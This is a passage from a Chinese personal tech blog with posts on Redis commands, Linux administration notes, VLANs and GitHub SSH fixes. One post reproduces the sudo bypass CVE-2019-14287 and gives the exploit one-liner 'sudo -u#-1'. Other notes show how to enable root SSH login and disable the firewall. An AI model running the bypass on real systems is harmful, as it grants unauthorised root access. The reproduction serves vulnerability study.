<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; lpush plant apple</span><br><span class="line">(integer) 1</span><br><span class="line">127.0.0.1:6379&gt; lpush plant orange</span><br><span class="line">(integer) 2</span><br><span class="line">127.0.0.1:6379&gt; lrange plant 0 1</span><br><span class="line">1) &quot;orange&quot;</span><br><span class="line">2) &quot;apple&quot;</span><br><span class="line">127.0.0.1:6379&gt; lpush plant banana</span><br><span class="line">(integer) 3</span><br><span class="line">127.0.0.1:6379&gt; lrange plant 0 1</span><br><span class="line">1) &quot;banana&quot;</span><br><span class="line">2) &quot;orange&quot;</span><br><span class="line">127.0.0.1:6379&gt; lrange plant 0 2</span><br><span class="line">1) &quot;banana&quot;</span><br><span class="line">2) &quot;orange&quot;</span><br><span class="line">3) &quot;apple&quot;</span><br></pre></td></tr></table></figure></div>

<p><strong>Set（集合）</strong><br>redis的set是string类型的无序集合<br>集合是通过哈希表实现的，所以添加，删除，查找的复杂度都为o(1)</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; sadd plant apple</span><br><span class="line">(integer) 1</span><br><span class="line">127.0.0.1:6379&gt; sadd plant orange</span><br><span class="line">(integer) 1</span><br><span class="line">127.0.0.1:6379&gt; sadd plant banana</span><br><span class="line">(integer) 1</span><br><span class="line">127.0.0.1:6379&gt; smembers plant</span><br><span class="line">1) &quot;orange&quot;</span><br><span class="line">2) &quot;banana&quot;</span><br><span class="line">3) &quot;apple&quot;</span><br></pre></td></tr></table></figure></div>

<p><strong>zset（sorted set：有序列表）</strong><br>和set一样也是string类型元素的集合，且不允许重复<br>不同的是每个元素都会关联一个double类型的分数，redis正是通过分数来为集合中的成员进行从小到大的排序<br>成员是唯一的，当分数却可以重复<br>zadd key score member </p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; zadd plant 0 apple</span><br><span class="line">(integer) 1</span><br><span class="line">127.0.0.1:6379&gt; zadd plant 0 orange</span><br><span class="line"> 127.0.0.1:6379&gt; zadd plant 0 banana</span><br><span class="line">(integer) 1</span><br><span class="line">127.0.0.1:6379&gt; zrangebyscore plant 0 1</span><br><span class="line">1) &quot;apple&quot;</span><br><span class="line">2) &quot;banana&quot;</span><br><span class="line">3) &quot;orange&quot;</span><br></pre></td></tr></table></figure></div>

<p><strong>对键值key的操作</strong><br>见 <a href="https://www.cnblogs.com/reyinever/p/10041108.html" target="_blank" rel="noopener">https://www.cnblogs.com/reyinever/p/10041108.html</a><br>    <a href="https://www.runoob.com/redis/redis-keys.html" target="_blank" rel="noopener">https://www.runoob.com/redis/redis-keys.html</a></p>
<p><strong>redis事务</strong><br>可以一次执行多个命令，</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; multi</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; set a aaa</span><br><span class="line">QUEUED</span><br><span class="line">127.0.0.1:6379&gt; set b bbb</span><br><span class="line">QUEUED</span><br><span class="line">127.0.0.1:6379&gt; set c ccc</span><br><span class="line">QUEUED</span><br><span class="line">127.0.0.1:6379&gt; exec</span><br><span class="line">1) OK</span><br><span class="line">2) OK</span><br><span class="line">3) OK</span><br><span class="line">127.0.0.1:6379&gt;</span><br></pre></td></tr></table></figure></div>


      
    </div>
    
  </div>
  
  
</article>

  
    <article id="post-cve-2019-14287-sudo之权限绕过漏洞" class="article global-container article-type-post" itemscope itemprop="blogPost">
  
    <header class="article-header">
      
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/10/16/cve-2019-14287-sudo之权限绕过漏洞/">cve-2019-14287:sudo之权限绕过漏洞</a>
    </h1>
  

    </header>
  
  <div class="article-meta">
    <a href="/2019/10/16/cve-2019-14287-sudo之权限绕过漏洞/" class="article-date">
  <time datetime="2019-10-16T07:49:45.000Z" itemprop="datePublished">2019-10-16</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/漏洞复现/">漏洞复现</a>
  </div>

    
  </div>
  

  <div class="article-inner">
    
    <div class="article-content article-content-cloud" itemprop="articleBody">
      
        <h1 id="cve-2019-14287-sudo之权限绕过漏洞"><a href="#cve-2019-14287-sudo之权限绕过漏洞" class="headerlink" title="cve-2019-14287:sudo之权限绕过漏洞"></a>cve-2019-14287:sudo之权限绕过漏洞</h1><p>影响版本：sudo 1.8.28之前的所有版本<br>这里我的环境是Centos7，sudo版本为1.8.23<br>/etc/sudoers 文件中all关键字允许admin或者sudo组中的所有用户以系统中的任何有效用户身份允许任何命令<br>sudoers文件如下：<br><img src="/images/Article_images/linux_test.png" alt="sudoers文件"><br>要使用sudo绕过，前提是要有上面sudoers文件的安全策略设置 root    ALL=(ALL:ALL)ALL</p>
<p><strong>如何利用这个漏洞：</strong></p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u#-1 命令，，，或者 sudo -u#4294967295</span><br></pre></td></tr></table></figure></div>

<p>下面开始测试，<br><img src="/images/Article_images/linux_test2.png" alt></p>
<p><strong>最后</strong><br>导致这个漏洞的原因是由于将用户ID转换为用户名的函数会将-1（或无效等效的4294967295）误认为是0，，而0有恰好是root的ID</p>

      
    </div>
    
  </div>
  
  
</article>

  
    <article id="post-Linux小记" class="article global-container article-type-post" itemscope itemprop="blogPost">
  
    <header class="article-header">
      
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/10/07/Linux小记/">Linux小记</a>
    </h1>
  

    </header>
  
  <div class="article-meta">
    <a href="/2019/10/07/Linux小记/" class="article-date">
  <time datetime="2019-10-07T10:17:21.000Z" itemprop="datePublished">2019-10-07</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/杂记/">杂记</a>
  </div>

    
  </div>
  

  <div class="article-inner">
    
    <div class="article-content article-content-cloud" itemprop="articleBody">
      
        <p><strong>创建一个连root也删不了的文件</strong><br>,,,其实也不是root删不了 root改下这个文件属性 还是可以删除的,,,<br>查看文件隐藏属性        <div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lsattr 文件名 </span><br><span class="line">lsattr -a 将隐藏文件的属性也列出来</span><br><span class="line">lsattr -R 连同子目录的数据也列出来</span><br></pre></td></tr></table></figure></div></p>
<p>chattr 改变文件属性，，还有一些参数有兴趣可自行百度，这里 -i 可删除不了这个文件</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chattr -i 不得任意更改文件或目录</span><br></pre></td></tr></table></figure></div>

<p><strong>环境变量</strong><br>name=value 格式</p>
<ul>
<li>按生命周期分类<br>  永久环境变量：修改相关配置文件，永久生效<br>  临时环境变量：使用 export命令，在当前终端下生效，关闭终端后失效</li>
<li>按作用域分类<br>  系统环境变量：对该系统中所有用户生效<br>  用户环境变量：对当前或特定用户生效</li>
</ul>
<p>设置方法<br>在/etc/profile中添加变量，这种方法对所有用户生效<br>例如：</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#set our default path</span><br><span class="line">PATH=&quot;/usr/local/sbin:/usr/local/bin:/usr/bin&quot;</span><br><span class="line">export PATH</span><br></pre></td></tr></table></figure></div>

<p>添加之后，使用<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure></div></p>
<p>让其生效.<br>在</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/.bash_profile</span><br></pre></td></tr></table></figure></div>

<p>中添加变量，对当前用户永久生效<br>直接运行export 定义变量，这是临时生效<br>echo $PATH,,或者,,env,,,,,查看所有的环境变量</p>
<p>LD_PRELOAD<br>该环境变量可以定义在程序运行前优先加载的动态链接库。在pwn中，可能需要一个特定的libc，这时候就可以定义它：</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LD_PRELOAD=/path/to/libc.so ./binary</span><br></pre></td></tr></table></figure></div>

<p>可以参考，，，<a href="https://blog.csdn.net/king523103/article/details/46929669" target="_blank" rel="noopener">https://blog.csdn.net/king523103/article/details/46929669</a></p>
<p><strong>procfs</strong><br>是linux内核提供的虚拟文件系统，为访问系统内核数据的操作提供接口。之所以说是虚拟文件系统，是因为它只占内存，而不占存储空间 。用户可以通过procfs查看有关系统硬件机正在运行进程的信息，甚至可以修改某些内容去改变内核的运行状态<br><strong>/proc/cmdline</strong><br>在启动时传递给内核的相关参数信息，通常由lilo或者grub等启动管理工具提供：<br><strong>/proc/cpuinfo</strong><br>记录cpu相关信息<br><strong>/proc/crypto</strong><br>已安装的内核所使用的密码算法和算法的详细信息<br><strong>/proc/devices</strong><br>已加载的所有块设备和字符设备的信息，包含主设备号和设备组名<br><strong>/proc/interrupts</strong><br>x86/x86_64系统上每个IRQ相关的中断号列表，多路处理器平台上每个cpu对于每个i/o设备均有自己的中断号<br><strong>/proc/kcore</strong><br>系统使用的物理内存，以ELF核心文件格式存储<br><strong>/proc/meminfo</strong><br>系统中关于当前内存的使用情况等的信息<br><strong>/proc/mounts</strong><br>每个进程自身挂在名称空间中的所有挂载点列表文件的符号链接<br><strong>/proc/modules</strong><br>当前装入内核的所有模块名称列表，可以由    lsmod    命令使用。其中第一列表示模块 名，第二列表示此模块占用内存空间大小，第三列表示此模块有多少实例被装入， 第四列表示此模块依赖于其它哪些模块，第五列表示此模块的装载状态：Live（已 经装入）、Loading（正在装入）和    Unloading（正在卸载），第六列表示此模块在 内核内存（kernel    memory）中的偏移量</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$cat /proc/modules</span><br><span class="line">fuse	118784	3	-	Live	0xffffffffc0d9b000</span><br><span class="line">ccm	   20480 3	-	Live	0xffffffffc0d95000</span><br><span class="line">rfcomm	86016	4	-	Live	0xffffffffc0d7f000</span><br><span class="line">bnep	24576	2	-	Live	0xffffffffc0d78000</span><br></pre></td></tr></table></figure></div>

<p><strong>/proc/slabinfo</strong><br>保存着监视系统中所有活动的slab缓存信息<br><strong>/proc/[pid]/cmdline</strong><br>启动当前进程的完整命令<br><strong>/proc/[pid]/exe</strong><br>指向启动当前进程的可执行文件的符号链接<br>        <strong>/proc/[pid]maps</strong><br>        最常用到的，用于显示进程的内存区域映射信息<br><strong>/proc/[pid]/environ</strong><br>包含了进程的环境变量</p>
<p>============================================================================================================================================================<br><strong>这里记载着某些时候需要用到的命令</strong><br>df -hl 查看磁盘剩余空间</p>
<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">└──╼ #df -hl</span><br><span class="line">Filesystem      Size  Used Avail Use% Mounted on</span><br><span class="line">udev            950M     0  950M   0% /dev</span><br><span class="line">tmpfs           197M   16M  181M   9% /run</span><br><span class="line">/dev/sda5        80G  6.4G   72G   9% /</span><br><span class="line">tmpfs           984M     0  984M   0% /dev/shm</span><br><span class="line">tmpfs           5.0M  4.0K  5.0M   1% /run/lock</span><br><span class="line">tmpfs           984M     0  984M   0% /sys/fs/cgroup</span><br><span class="line">/dev/sda1       346M   81M  243M  25% /boot</span><br><span class="line">tmpfs           197M   20K  197M   1% /run/user/0</span><br></pre></td></tr></table></figure></div>

<p>这里/dev/sda1 表示,,,sd硬盘接口的第一个硬盘(a),第一个分区(1)，</p>
<p>du -sh[目录名]返回该目录大小<br>df -h 查看每个根路径分区大小<br>df -sh * 查看每个文件夹大小</p>
<hr>
<p><strong>tmux,很不错的一款linux从业者的利器</strong>0</p>
<p>tmux new -s foo # 新建名称为 foo 的会话<br>tmux ls # 列出所有 tmux 会话<br>tmux a # 恢复至上一次的会话<br>tmux a -t foo # 恢复名称为 foo 的会话，会话默认名称为数字<br>tmux kill-session -t foo # 删除名称为 foo 的会话<br>tmux kill-server # 删除所有的会话<br>ctr+b +c 增加窗口，</p>
<hr>
<p>screen 命令<br>主要用于关闭xshell时，程序服务器里的程序仍然运行</p>
<p>创建会话        screen -S  test, 创建一个名为test会话</p>
<p>暂时离开，保留screen会话中的任务或程序<br>当需要临时离开(会话中的程序不会关闭，仍在运行)可以用Ctrl+a d(按住ctrl，然后再依次按a，b)</p>
<p>恢复会话<br>screen -r test 即可恢复到离开前创建的test会话的工作界面。如果忘记了，或者但是没有指定会话名，可以执行:screen -ls 会列出当前存在的会话列表<br>当目前已经暂时退出了会话，状态为Detached;当使用screen -r test 后状态会变为Attached,,,恢复会话时可以使用 screen -r 进程ID</p>
<p>Ctrl+a c 在当前screen会话中创建窗口<br>Ctrl+a w 窗口列表<br>ctrl+a n 下一个窗口<br>ctrl+a p 上一个窗口<br>ctrl+1 0-9 在第0-9之间切换</p>
<p>===============================================================</p>
<p>centos开启80端口<br>firewall-cmd –zone=public –add-port=80/tcp –permanent</p>
<p>查询端口是否开启<br>firewall-cmd –query-port=80/tcp</p>
<p>重启防火墙<br>firewall-cmd –reload</p>
<p>查询有哪些端口开启<br>firewall-cmd –list-port</p>
<p>–zone #作用域<br>–add-port=80 #添加端口 ,格式为：端口/协议<br>–permanent #永久有效，无此参数重启后会失效</p>
<p>关闭firewall<br>systemctl stop firewalld # 停止firewall<br>systemctl disable firewalld #禁止firewall开机启动</p>
<p>关于firewall-cmd D:/desktop/我都笔记/firewall-cmd</p>
<p>=========================================================<br>kali中开启ssh<br>修改/etc/ssh/sshd_config<br>找到#PasswordAuthentication yes 把#去掉<br>将PermitRootLogin without-password修改为 PermitRootLogin yes<br>启动ssh   /etc/init.d/ssh start<br>开机自启 update-rc.d ssh enable</p>
<p>=========================================================================<br>linux 开启定时任务<br>crontab命令<br>-u 只有root才能进行这个任务，<br>-e 编辑crontab工作内容<br>-l 查询crontab工作内容<br>-r 删除所有crontab工作内容，<br>分 时 日 月 周 </p>
<p>======================================================================<br>#关于awk<br>是一个处理文本文件的语言，是一个强大的文本分析工具<br>基本用法<br>打印a.txt 中第一列和第二列中的内容<br>awk ‘print $1,$2’ a.txt</p>
<p>awk -F “:” ‘print $1,$2’ a.txt<br>打印a.txt中以：为分隔的第一列和第二列</p>
<p>使用正则，字符串匹配<br>~表示模式开始，//中式模式<br>awk ‘$2 ~ /th/ {print $2,$4}’ a.txt</p>

      
    </div>
    
  </div>
  
  
</article>

  
    <article id="post-VLAN-与-Trunk" class="article global-container article-type-post" itemscope itemprop="blogPost">
  
    <header class="article-header">
      
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/10/06/VLAN-与-Trunk/">VLAN 与 Trunk</a>
    </h1>
  

    </header>
  
  <div class="article-meta">
    <a href="/2019/10/06/VLAN-与-Trunk/" class="article-date">
  <time datetime="2019-10-06T07:36:52.000Z" itemprop="datePublished">2019-10-06</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/网络工程/">网络工程</a>
  </div>

    
  </div>
  

  <div class="article-inner">
    
    <div class="article-content article-content-cloud" itemprop="articleBody">
      
        <p>二层交换机就是传统意义上的交换，使用mac地址作为转发依据，建立起mac到端口的映射，，，一般的二层交换机是没有三层功能，也就是不能配置静态路由<br>三层交换则是建立起ip到端口的映射，建立在路由的基础上的。可以理解为二层交换与路由的叠加，实际上，三层交换要强于二层交换与路由的叠加</p>
<p><strong>简介</strong><br>路由器能够将广播包阻隔在一个接口上，但是，路由器LAN接口数量有限，主要功能是再网络间传输数据，而不是对终端设备提供网络接入。访问LAN的功能还是接入层交换机实现，与三层交换机相似,通过在二层交换机上创建VLAN来减少广播域。现代交换机就是通过VLAN来构建的，因此某种程度上来讲，学习交换机就是学习vlan</p>
<p>** 什么是VLAN **<br>它是一组与位置无关的逻辑端口，相当于一个独立的三层网络</p>
<p><strong>什么是trunk</strong><br>Trunk是两个网络设备之间承载多于一种vlan的端到端的连接，将vlan延申至整个网络，没有vlan Trunk，vlan也不会非常有用。vlan trunk允许vlan数据流在交换机间传输，所以设备在同一vlan，但连接到不同交换机，能够不通过路由器来进行通信<br><strong>一个VLAN trunk不属于莫伊特定vlan</strong><br>而是交换机和路由器间多个vlan 的通道。<br>当安装好trunk线之后，帧在trunk线传输就可以使用trunk协议来修改以太网帧。这就意味着交换机端口有不止一种模式，缺省情况下，所有端口被称为接入端口。当一个端口用于交换机间互联传输vlan信息时，这种端口模式改变为trunk，节点路由器通常也不知道vlan的存在并使用标准以太网帧或“untagged”帧，trunk线能够使用“tagged”帧来标记vlan或优先级。<br>因此，在trunk端口，运行trunk协议来允许帧中包含trunk信息<br><img src="/images/Article_images/image04.jpg" alt><br>pc1在经过路由表处理后向pc2发送数据流，这两个节点在同一vlan但不同交换机</p>
<ul>
<li>以太网帧离开pc1到达switch1</li>
<li>以太网1的SAT表明目的地时trunk线的另一端</li>
<li>switch1使用trunk协议在以太网帧中添加vlan id；</li>
<li>新帧离开switch1的trunk端口被switch2接收</li>
<li>源帧按照switch2的sat转发到目的地址（端口4）</li>
</ul>
<p>vlan tag 如图所示，包含类型域，优先级域，CFI指示mac数据域，vlan id；<br><img src="/images/Article_images/image05.jpg" alt></p>

      
    </div>
    
  </div>
  
  
</article>

  
    <article id="post-git-ssh连不上github问题" class="article global-container article-type-post" itemscope itemprop="blogPost">
  
    <header class="article-header">
      
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/10/04/git-ssh连不上github问题/">git ssh连不上github问题</a>
    </h1>
  

    </header>
  
  <div class="article-meta">
    <a href="/2019/10/04/git-ssh连不上github问题/" class="article-date">
  <time datetime="2019-10-04T14:47:24.000Z" itemprop="datePublished">2019-10-04</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/杂记/">杂记</a>
  </div>

    
  </div>
  

  <div class="article-inner">
    
    <div class="article-content article-content-cloud" itemprop="articleBody">
      
        <p>开始的时候是可以连上的，后来不知道怎么的就不行了，，，网上找了好久终于解决了，，这里我整理了一下这些问题</p>
<h1 id="第一种情况"><a href="#第一种情况" class="headerlink" title="第一种情况"></a>第一种情况</h1><ul>
<li>ping不了github.com<br>到本地hosts文件中添加一条github记录，并且删除.ssh中的known_hosts文件<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">192.30.255.112 github.com git </span><br><span class="line">185.31.16.184 github.global.ssl.fastly.net</span><br></pre></td></tr></table></figure></div>

</li>
</ul>
<p>然后本地ping通了github，，，遂解决了连接不上的问题</p>
<h1 id="第二种情况"><a href="#第二种情况" class="headerlink" title="第二种情况"></a>第二种情况</h1><ul>
<li>22端口被占用<br>在.ssh文件夹中添加一个config文件，内容为：<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">User git</span><br><span class="line">Hostname ssh.github.com</span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">IdentityFile ~/.ssh/id_rsa</span><br><span class="line">Port 443</span><br></pre></td></tr></table></figure></div>

</li>
</ul>
<h1 id="第三种"><a href="#第三种" class="headerlink" title="第三种"></a>第三种</h1><ul>
<li>ssh key失效了<br>删除.ssh，重新进行配置<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;yournamne&quot;</span><br><span class="line">git config --global user.email &quot;youremail&quot;</span><br><span class="line">ssh-keygen -t rsa -C &quot;youremail&quot;</span><br><span class="line">将.ssh中id_rsa.pub中的内容复制到github中ssh and gpg keys</span><br></pre></td></tr></table></figure></div>

</li>
</ul>
<p>然后尝试连接 ssh -T <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>，输入yes，，如果出现success，就代表连接成功</p>

      
    </div>
    
  </div>
  
  
</article>

  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
  </nav>


</section>
        <aside id="sidebar">
  
    <div class="widget-box">
  <div class="avatar-box">
    <img class="avatar" src="/images/default-avatar.jpg" title="图片来自网络"></img>
    <h3 class="avatar-name">
      
        闪电啊哈哈
      
    </h3>
    <p class="avatar-slogan">
      何必管一片海，有多澎湃
    </p>
  </div>
</div>


  
    
  <div class="widget-box">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/WEB相关/">WEB相关</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/无线渗透/">无线渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂记/">杂记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/漏洞复现/">漏洞复现</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/网络工程/">网络工程</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/计算机操作系统/">计算机操作系统</a></li></ul>
    </div>
  </div>


  
    

  
    
  
    
  <div class="widget-box">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li></ul>
    </div>
  </div>

  
    
  <div class="widget-box">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/06/05/某个SpringBoot系统的审计/">某个SpringBoot项目的审计</a>
          </li>
        
          <li>
            <a href="/2019/11/03/操作系统概述/">操作系统概述</a>
          </li>
        
          <li>
            <a href="/2019/10/30/关于php反序列化漏洞小记/">关于php反序列化漏洞小记</a>
          </li>
        
          <li>
            <a href="/2019/10/24/CVE-2019-11043-复现/">CVE-2019-11043 复现</a>
          </li>
        
          <li>
            <a href="/2019/10/23/WiFi网络结构/">WiFi网络结构</a>
          </li>
        
      </ul>
    </div>
  </div>

  
      <div class="widget-box">
    <h3 class="widget-title">友链</h3>
    <div class="widget">
      
    </div>
  </div>

  
</aside>
      </div>
      <footer id="footer">
  <div class="foot-box global-width">
    &copy; 2021 闪电 &nbsp;&nbsp;
    Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    &nbsp;|&nbsp;主题 <a href="https://github.com/yiluyanxia/hexo-theme-antiquity">antiquity</a>
    <br>
    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span id="busuanzi_container_site_pv">不蒜子告之   阁下是第<span id="busuanzi_value_site_pv"></span>个访客</span>
  </div>
</footer>
      <script src="https://code.jquery.com/jquery-2.0.3.min.js"></script>
<script>
if (!window.jQuery) {
var script = document.createElement('script');
script.src = "/js/jquery-2.0.3.min.js";
document.body.write(script);
}
</script>

  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>



    </div>
    <nav id="mobile-nav" class="mobile-nav-box">
  <div class="mobile-nav-img mobile-nav-top"></div>
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
  <div class="mobile-nav-img  mobile-nav-bottom"></div>
</nav>    
  </div>
</body>
</html>